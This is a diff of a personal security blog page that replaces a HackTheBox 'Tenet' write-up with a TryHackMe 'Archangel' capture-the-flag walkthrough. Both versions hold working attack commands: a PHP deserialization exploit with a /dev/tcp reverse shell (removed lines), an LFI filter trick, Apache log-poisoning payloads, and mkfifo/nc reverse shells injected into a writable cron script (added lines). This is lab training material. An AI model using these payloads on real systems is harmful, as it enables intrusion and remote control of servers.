@@ -22,27 +22,27 @@
 
   <!-- Begin Jekyll SEO tag v2.7.1 -->
 <meta name="generator" content="Jekyll v4.2.0" />
-<meta property="og:title" content="Hackthebox Tenet" />
+<meta property="og:title" content="Tryhackme Archangel" />
 <meta name="author" content="Razor-Sec" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="Introduction" />
-<meta property="og:description" content="Introduction" />
-<link rel="canonical" href="/posts/writeup-hackthebox-tenet/" />
-<meta property="og:url" content="/posts/writeup-hackthebox-tenet/" />
+<meta name="description" content="Introduction This is partical room from tryhackme entitled archangel with easy difficulty, but for me its medium difficulty. In this room we will learn about boot2root, Web Exploitation. room link here" />
+<meta property="og:description" content="Introduction This is partical room from tryhackme entitled archangel with easy difficulty, but for me its medium difficulty. In this room we will learn about boot2root, Web Exploitation. room link here" />
+<link rel="canonical" href="/posts/writeup-tryhackme-archanel/" />
+<meta property="og:url" content="/posts/writeup-tryhackme-archanel/" />
 <meta property="og:site_name" content="Razor-Sec" />
 <meta property="og:type" content="article" />
-<meta property="article:published_time" content="2020-02-11T00:00:00+07:00" />
+<meta property="article:published_time" content="2020-02-12T00:00:00+07:00" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="Hackthebox Tenet" />
+<meta property="twitter:title" content="Tryhackme Archangel" />
 <meta name="twitter:site" content="@0xrxd" />
 <meta name="twitter:creator" content="@Razor-Sec" />
 <meta name="google-site-verification" content="google_meta_tag_verification" />
 <script type="application/ld+json">
-{"description":"Introduction","@type":"BlogPosting","headline":"Hackthebox Tenet","dateModified":"2020-02-11T00:00:00+07:00","datePublished":"2020-02-11T00:00:00+07:00","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/writeup-hackthebox-tenet/"},"author":{"@type":"Person","name":"Razor-Sec"},"url":"/posts/writeup-hackthebox-tenet/","@context":"https://schema.org"}</script>
+{"description":"Introduction This is partical room from tryhackme entitled archangel with easy difficulty, but for me its medium difficulty. In this room we will learn about boot2root, Web Exploitation. room link here","@type":"BlogPosting","headline":"Tryhackme Archangel","dateModified":"2020-02-12T00:00:00+07:00","datePublished":"2020-02-12T00:00:00+07:00","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/writeup-tryhackme-archanel/"},"author":{"@type":"Person","name":"Razor-Sec"},"url":"/posts/writeup-tryhackme-archanel/","@context":"https://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
 
 
-  <title>Hackthebox Tenet | Razor-Sec
+  <title>Tryhackme Archangel | Razor-Sec
   </title>
 
   <!--
@@ -450,7 +450,7 @@
       
 
         
-          <span>Hackthebox Tenet</span>
+          <span>Tryhackme Archangel</span>
 
         
 
@@ -527,7 +527,7 @@
 
     <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
 
-      <h1 data-toc-skip>Hackthebox Tenet</h1>
+      <h1 data-toc-skip>Tryhackme Archangel</h1>
 
       <div class="post-meta text-muted d-flex flex-column">
         <!-- Published date and author -->
@@ -544,17 +544,17 @@
   
     data-toggle="tooltip"
     data-placement="bottom"
-    title="Tue, Feb 11, 2020, 12:00 AM +0700"
+    title="Wed, Feb 12, 2020, 12:00 AM +0700"
   >
 
   
   
 
   
-    Feb 11, 2020
+    Feb 12, 2020
   
 
-  <i class="unloaded">2020-02-11T00:00:00+07:00</i>
+  <i class="unloaded">2020-02-12T00:00:00+07:00</i>
 
 </span>
 
@@ -583,7 +583,7 @@
 
 
 <!-- return element -->
-<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="957 words">5 min</span>
+<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1501 words">8 min</span>
 
 
           <!-- page views -->
@@ -596,17 +596,15 @@
       <div class="post-content">
 
         
-          <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/htb_tenet/bg.png" class="preview-img" alt="image alternative text">
+          <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/thm_archangel/bg.jpg" class="preview-img" alt="image alternative text">
         
 
         <h2 id="introduction">Introduction</h2>
-
-<p>The tenet machine of Hackthebox is an active machine. here we will learn a lot about RCE in php and other privileges. I suggest you read all of these writeups to understand what’s going on here. you can join this room in <a href="https://www.hackthebox.eu/home/machines/profile/309">here</a></p>
+<p>This is partical room from tryhackme entitled archangel with easy difficulty, but for me its medium difficulty. In this room we will learn about boot2root, Web Exploitation. room link <a href="https://tryhackme.com/room/archangel">here</a></p>
 
 <h2 id="enumeration">Enumeration</h2>
-
-<h3 id="nmap">Nmap</h3>
-<p>first we must scanning the machine :</p>
+<h3 id="nmap">nmap</h3>
+<p>First we must scanning the box with nmap for enumeration.</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
@@ -626,59 +624,31 @@
 17
 18
 19
-20
-</pre></td><td class="rouge-code"><pre>$ sudo nmap -sC -sV 10.10.10.223  
-
-Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-11 21:56 WIB
-Nmap scan report for tenet.htb (10.10.10.223)
-Host is up (0.020s latency).
+</pre></td><td class="rouge-code"><pre>$ sudo nmap -sC -sV 10.10.172.38
+ 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-12 15:53 WIB
+Nmap scan report for 10.10.40.126
+Host is up (0.34s latency).
 Not shown: 998 closed ports
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
-|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
-|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
-|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
+|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
+|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
+|_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-|_http-generator: WordPress 5.6
 |_http-server-header: Apache/2.4.29 (Ubuntu)
-|_http-title: Tenet
+|_http-title: Wavefire
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 8.81 seconds
+Nmap done: 1 IP address (1 host up) scanned in 24.49 seconds
 </pre></td></tr></tbody></table></code></div></div>
 
-<p>Thats only 2 port open. now lets put tenet.htb to /etc/hosts and see what happen.</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-</pre></td><td class="rouge-code"><pre>$ sudo nano /etc/hosts
-
-127.0.0.1       localhost
-127.0.1.1       Razor
-
-10.10.10.223 tenet.htb
-
-# The following lines are desirable for IPv6 capable hosts
-::1     localhost ip6-localhost ip6-loopback
-ff02::1 ip6-allnodes
-ff02::2 ip6-allrouters
-</pre></td></tr></tbody></table></code></div></div>
-<p>now after that lets jump to webserver : http://tenet.htb</p>
-
-<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/htb_tenet/bg_1.png" alt="image" /></p>
-
-<p>After I looking around on the website I found a comment on the migration tab which gives us a hint, namely “The sator php”, let’s try inputting Sator into a subdomain and looking for the sator.php file:</p>
-
+<p>nmap tell us the box have 2 port open which is ssh and webserver. now lets check the webserver
+<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/thm_archangel/bg_1.jpg" alt="image" /></p>
+<h2 id="flag-1">Flag 1</h2>
+<p>as you can see the webserver using mafialive.thm lets add this to hosts</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
@@ -691,30 +661,77 @@ ff02::2 ip6-allrouters
 10
 11
 </pre></td><td class="rouge-code"><pre>sudo nano /etc/hosts
-
+                                                  
 127.0.0.1       localhost
 127.0.1.1       Razor
 
-10.10.10.223 tenet.htb sator.tenet.htb
+10.10.172.38 mafialive.thm
 
 # The following lines are desirable for IPv6 capable hosts
 ::1     localhost ip6-localhost ip6-loopback
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 </pre></td></tr></tbody></table></code></div></div>
-<p>and thats right, subdomain is working but its just only default webpage from apache.</p>
+<p>then lets go to mafialive.thm and here the result
+<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/thm_archangel/bg_2.jpg" alt="image" /></p>
 
-<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/htb_tenet/bg_2.png" alt="image" /></p>
+<p>now we got first flag, now lets looking for any directory on this web.</p>
 
-<p>Lets put sator.php on this subdomain :</p>
+<h2 id="flag-2">Flag 2</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre></td><td class="rouge-code"><pre>gobuster dir -u http://mafialive.thm/ -w /home/razor/Documents/Wordlist/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://mafialive.thm/
+[+] Threads:        10
+[+] Wordlist:       /home/razor/Documents/Wordlist/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     php
+[+] Timeout:        10s
+===============================================================
+2021/02/12 19:12:48 Starting gobuster
+===============================================================
+/test.php (Status: 200)
+Progress: 665 / 220561 (0.30%)
 
-<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/htb_tenet/bg_3.png" alt="image" /></p>
+</pre></td></tr></tbody></table></code></div></div>
+<p>with gobuster we found file test.php, lets check it
+<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/thm_archangel/bg_3.jpg" alt="image" />
+We found flag 1</p>
 
-<p>now you can grab php with add extension .bak and we can analysis :</p>
+<p>and when click “here is button” we going to <code class="language-plaintext highlighter-rouge">test.php?view=/var/www/html/development_testing/mrrobot.php</code> its just output text like <code class="language-plaintext highlighter-rouge">echo 'control is an illusion' </code>. now lets see the source with using filter php :</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>script : "pHp://FilTer/convert.base64-encode/resource= "
+now add to test.php :  " http://mafialive.thm/test.php?view=php://FilTer/convert.base64-encode/resource=/var/www/html/development_testing/test.php " 
+</pre></td></tr></tbody></table></code></div></div>
 
-<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/htb_tenet/bg_4.png" alt="image" /></p>
+<h3 id="file-inclusion">File Inclusion</h3>
 
-<p>There is the code :</p>
+<p>Output : 
+<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/thm_archangel/bg_5.jpg" alt="image" /></p>
+
+<p>its base64 encode, lets decode it</p>
 <div class="language-bat highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
@@ -745,44 +762,113 @@ ff02::2 ip6-allrouters
 28
 29
 30
-</pre></td><td class="rouge-code"><pre><span class="o">&lt;?</span><span class="kd">php</span>
+31
+32
+33
+</pre></td><td class="rouge-code"><pre><span class="kd">CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw</span><span class="na">+Cgo</span><span class="m">8</span><span class="kd">aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE</span><span class="na">+CiAKICAgIDwvYnV</span><span class="m">0</span><span class="kd">dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E</span><span class="na">+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC</span><span class="m">8</span><span class="kd">vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8</span><span class="na">+CiAgICA</span><span class="m">8</span><span class="kd">L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg</span><span class="o">==</span> 
 
-<span class="kd">class</span> <span class="kd">DatabaseExport</span>
-<span class="o">{</span>
-        <span class="kd">public</span> $user_file <span class="o">=</span> <span class="s1">'users.txt'</span><span class="o">;</span>
-        <span class="kd">public</span> $data <span class="o">=</span> <span class="s1">''</span><span class="o">;</span>
+<span class="o">-</span> <span class="kd">decode</span> : 
 
-        <span class="kd">public</span> <span class="kd">function</span> <span class="kd">update_db</span><span class="o">()</span>
-        <span class="o">{</span>
-                <span class="nb">echo</span> <span class="s1">'[+] Grabbing users from text file &lt;br&gt;'</span><span class="o">;</span>
-                $this<span class="o">-&gt;</span> <span class="kd">data</span> <span class="o">=</span> <span class="s1">'Success'</span><span class="o">;</span>
+<span class="o">&lt;</span><span class="err">!</span><span class="kd">DOCTYPE</span> <span class="kd">HTML</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="kd">html</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="kd">head</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="nb">title</span><span class="o">&gt;</span><span class="kd">INCLUDE</span><span class="o">&lt;</span><span class="na">/title</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="kd">h1</span><span class="o">&gt;</span><span class="kd">Test</span> <span class="kd">Page</span>. <span class="kd">Not</span> <span class="kd">to</span> <span class="kd">be</span> <span class="kd">Deployed</span><span class="o">&lt;</span><span class="na">/h</span><span class="m">1</span><span class="o">&gt;</span>
+ 
+    <span class="o">&lt;</span><span class="na">/button</span><span class="o">&gt;&lt;</span><span class="na">/a</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="kd">a</span> <span class="kd">href</span><span class="o">=</span><span class="s2">"/test.php?view=/var/www/html/development_testing/mrrobot.php"</span><span class="o">&gt;&lt;</span><span class="kd">button</span> <span class="kd">id</span><span class="o">=</span><span class="s2">"secret"</span><span class="o">&gt;</span><span class="kd">Here</span> <span class="kd">is</span> <span class="kd">a</span> <span class="kd">button</span><span class="o">&lt;</span><span class="na">/button</span><span class="o">&gt;&lt;</span><span class="na">/a</span><span class="o">&gt;&lt;</span><span class="kd">br</span><span class="o">&gt;</span>
+        <span class="o">&lt;?</span><span class="kd">php</span>
+
+            //FLAG: <span class="kd">thm</span><span class="o">{</span><span class="kd">ex</span><span class="o">--------</span><span class="na">--f</span><span class="m">1</span><span class="o">}</span>
+
+            <span class="kd">function</span> <span class="kd">containsStr</span><span class="o">(</span>$str<span class="o">,</span> $substr<span class="o">)</span> <span class="o">{</span>
+                <span class="kd">return</span> <span class="kd">strpos</span><span class="o">(</span>$str<span class="o">,</span> $substr<span class="o">)</span> <span class="err">!</span><span class="o">==</span> <span class="kd">false</span><span class="o">;</span>
+            <span class="o">}</span>
+            <span class="k">if</span><span class="o">(</span><span class="kd">isset</span><span class="o">(</span>$_GET<span class="o">[</span><span class="s2">"view"</span><span class="o">])){</span>
+            <span class="k">if</span><span class="o">(</span><span class="err">!</span><span class="kd">containsStr</span><span class="o">(</span>$_GET<span class="o">[</span><span class="s1">'view'</span><span class="o">],</span> <span class="s1">'../..'</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="kd">containsStr</span><span class="o">(</span>$_GET<span class="o">[</span><span class="s1">'view'</span><span class="o">],</span> <span class="s1">'/var/www/html/development_testing'</span><span class="o">))</span> <span class="o">{</span>
+                <span class="kd">include</span> $_GET<span class="o">[</span><span class="s1">'view'</span><span class="o">];</span>
+            <span class="o">}</span><span class="k">else</span><span class="o">{</span>
+
+                <span class="nb">echo</span> <span class="s1">'Sorry, Thats not allowed'</span><span class="o">;</span>
+            <span class="o">}</span>
         <span class="o">}</span>
+        <span class="o">?&gt;</span>
+    <span class="o">&lt;</span><span class="na">/div</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="na">/body</span><span class="o">&gt;</span>
 
+<span class="o">&lt;</span><span class="na">/html</span><span class="o">&gt;</span>
 
-        <span class="kd">public</span> <span class="kd">function</span> __destruct<span class="o">()</span>
-        <span class="o">{</span>
-                <span class="kd">file_put_contents</span><span class="o">(</span>__DIR__ . <span class="s1">'/'</span> . $this <span class="o">-&gt;</span><span class="kd">user_file</span><span class="o">,</span> $this<span class="o">-&gt;</span><span class="kd">data</span><span class="o">);</span>
-                <span class="nb">echo</span> <span class="s1">'[] Database updated &lt;br&gt;'</span><span class="o">;</span>
-        //      <span class="nb">echo</span> <span class="s1">'Gotta get this working properly...'</span><span class="o">;</span>
-        <span class="o">}</span>
-<span class="o">}</span>
-
-$input <span class="o">=</span> $_GET<span class="o">[</span><span class="s1">'arepo'</span><span class="o">]</span> <span class="o">??</span> <span class="s1">''</span><span class="o">;</span>
-$databaseupdate <span class="o">=</span> <span class="kd">unserialize</span><span class="o">(</span>$input<span class="o">);</span>
-
-$app <span class="o">=</span> <span class="kd">new</span> <span class="kd">DatabaseExport</span><span class="o">;</span>
-$app <span class="o">-&gt;</span> <span class="kd">update_db</span><span class="o">();</span>
-
-
-<span class="o">?&gt;</span>
 </pre></td></tr></tbody></table></code></div></div>
-<h2 id="exploit">Exploit</h2>
+<h2 id="flag-3">Flag 3</h2>
+<ul>
+  <li>TL;DR — Apache Log Poisoning
+    <blockquote>
+      <p>The idea behind log poisoning is to put some php code (payload) into the logs, and then load them where php will be executed. If we look at the access log, we see that on each visit to the site, there’s an entry written with the url visited and the user-agent string of the browser visiting.
+The simplest case would be to change our user-agent string in a such a way that it includes php code, and then include that log file with our LFI.</p>
+    </blockquote>
+  </li>
+</ul>
 
-<p>after searchings i found insecure php serialization payload, you can see at <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Files/PHP-Serialization-RCE-Exploit.php">here</a></p>
+<p>lets using curl to testing rce</p>
 
-<p>and i’m modification that to this :</p>
+<p>i try to get /etc/passwd and its work!! . now after that letr try exploit by user-agent and look at access.log :</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>$ curl http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//../var/log/apache2/access.log|
+</pre></td></tr></tbody></table></code></div></div>
+<h3 id="log-poisoning">Log Poisoning</h3>
 
+<p>then user-agent to exploit</p>
 <div class="language-bat highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="nb">curl</span> <span class="s1">'http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//../var/log/apache2/access.log'</span> <span class="na">-H </span><span class="s2">"User-Agent: razor &lt;?php system('id'); ?&gt; rxd"</span>
+</pre></td></tr></tbody></table></code></div></div>
+<div class="language-bat highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="m">10</span>.2.47.251 <span class="o">-</span> <span class="o">-</span> <span class="o">[</span><span class="m">12</span><span class="na">/Feb</span>/2021:18:53:51 <span class="o">+</span><span class="m">0530</span><span class="o">]</span> <span class="s2">"GET /test.php?view=/var/www/html/development_testing/..//..//..//..//../var/log/apache2/access.log HTTP/1.1"</span> <span class="m">200</span> <span class="m">142433</span> <span class="s2">"-"</span> <span class="s2">"razor uid=33(www-data) gid=33(www-data) groups=33(www-data)
+ rxd"</span>
+</pre></td></tr></tbody></table></code></div></div>
+<p>yeay we got RCE via LFI and log poisoning, now we can get shell.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>$ curl 'http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//../var/log/apache2/access.log' -H "User-Agent: razor &lt;?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.2.47.251 1337 &gt;/tmp/f'); ?&gt; rxd"
+
+</pre></td></tr></tbody></table></code></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre></td><td class="rouge-code"><pre>$ nc -lvnp 1337                                                                                              1 ⨯
+listening on [any] 1337 ...
+connect to [10.2.47.251] from (UNKNOWN) [10.10.172.38] 58492
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ ls
+index.html
+mrrobot.php
+robots.txt
+test.php
+$ 
+</pre></td></tr></tbody></table></code></div></div>
+<p>and we get user flag</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>$ cat /home/archangel/user.txt
+thm{lf----------------ky}
+</pre></td></tr></tbody></table></code></div></div>
+
+<h2 id="flag-4">Flag 4</h2>
+
+<p>after that we can check crontab :</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -798,52 +884,80 @@ $app <span class="o">-&gt;</span> <span class="kd">update_db</span><span class="
 14
 15
 16
-</pre></td><td class="rouge-code"><pre><span class="o">&lt;?</span><span class="kd">php</span>
-<span class="kd">class</span> <span class="kd">DatabaseExport</span>
-<span class="o">{</span>
-        <span class="kd">public</span> $user_file <span class="o">=</span> <span class="s1">'razor-exploit.php'</span><span class="o">;</span>
-                                               
-        <span class="kd">public</span> $data <span class="o">=</span> <span class="s1">'&lt;?php exec("/bin/bash -c \'</span><span class="kd">bash</span> <span class="na">-i </span><span class="o">&gt;</span> <span class="na">/dev/tcp</span>/10.10.14.4&gt;
-        <span class="kd">public</span> <span class="kd">function</span> __destruct<span class="o">()</span>
-        <span class="o">{</span>
-                <span class="kd">file_put_contents</span><span class="o">(</span>__DIR__ . <span class="s1">'/'</span> . $this <span class="o">-&gt;</span><span class="kd">user_file</span><span class="o">,</span> $this<span class="o">-&gt;</span><span class="kd">data</span><span class="o">&gt;</span>
-                <span class="nb">echo</span> <span class="s1">'[Anjay abang ganteng lagi exploit code nya nich]'</span><span class="o">;</span>
-        <span class="o">}</span>
-<span class="o">}</span>
-$url <span class="o">=</span> <span class="s1">'http://10.10.10.223/sator.php?arepo='</span> . <span class="kd">urlencode</span><span class="o">(</span><span class="kd">serialize</span><span class="o">(</span><span class="kd">new</span> <span class="kd">Database</span><span class="o">&gt;</span>
-$response <span class="o">=</span> <span class="kd">file_get_contents</span><span class="o">(</span><span class="s2">"$url"</span><span class="o">);</span>
-$response <span class="o">=</span> <span class="kd">file_get_contents</span><span class="o">(</span><span class="s2">"http://10.10.10.223/razor-exploit.php"</span><span class="o">);</span>
-<span class="o">?&gt;</span>
-</pre></td></tr></tbody></table></code></div></div>
-<p>In Hacker command : ` nc -lvnp 4444 `
-then run command : ` php razor.php `</p>
+17
+18
+19
+</pre></td><td class="rouge-code"><pre>www-data@ubuntu:/var/www/html/mafialive$ cat /etc/crontab
+cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
 
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+*/1 *   * * *   archangel /opt/helloworld.sh
+17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+#
+www-data@ubuntu:/var/www/html/mafialive$ 
+</pre></td></tr></tbody></table></code></div></div>
+<p>You can see there is a crontab from the archangel, now let’s check the permissions</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
-</pre></td><td class="rouge-code"><pre>$ php back.php     
-[Anjay abang ganteng lagi exploit code nya nich]PHP Warning:
+4
+</pre></td><td class="rouge-code"><pre>www-data@ubuntu:/var/www/html/mafialive$ ls -la /opt/helloworld.sh
+-rwxrwxrwx 1 archangel archangel 66 Nov 20 10:35 /opt/helloworld.sh
+www-data@ubuntu:/var/www/html/mafialive$ 
 
 </pre></td></tr></tbody></table></code></div></div>
+<p>Wow all user can access it, so weird :X. now lets exploit that with sending reverse shell :</p>
+<div class="language-bat highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s1">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.2.47.251 6969 &gt;/tmp/f'</span> <span class="o">&gt;&gt;</span> <span class="na">/opt/helloworld</span>.sh<span class="s1">'
+</span></pre></td></tr></tbody></table></code></div></div>
+<p>then the crontab will be like this :</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre>www-data@ubuntu:/var/www/html/mafialive$ cat /opt/helloworld.sh 
+#!/bin/bash
+echo "hello world" &gt;&gt; /opt/backupfiles/helloworld.txt
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.2.47.251 6969 &gt;/tmp/f
+</pre></td></tr></tbody></table></code></div></div>
+<p>And wait a minute for getting a shell, then we can get the user :</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
 5
-</pre></td><td class="rouge-code"><pre>nc -lvnp 4444
-listening on [any] 4444 ...
-connect to [10.10.14.4] from (UNKNOWN) [10.10.10.223] 34284
-id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
+6
+</pre></td><td class="rouge-code"><pre>$ nc -lvnp 6969
+listening on [any] 6969 ...
+connect to [10.2.47.251] from (UNKNOWN) [10.10.172.38] 39360
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=1001(archangel) gid=1001(archangel) groups=1001(archangel)
 </pre></td></tr></tbody></table></code></div></div>
-<p>then we are connected to shell webserver</p>
+<p>and we found the flag of user again</p>
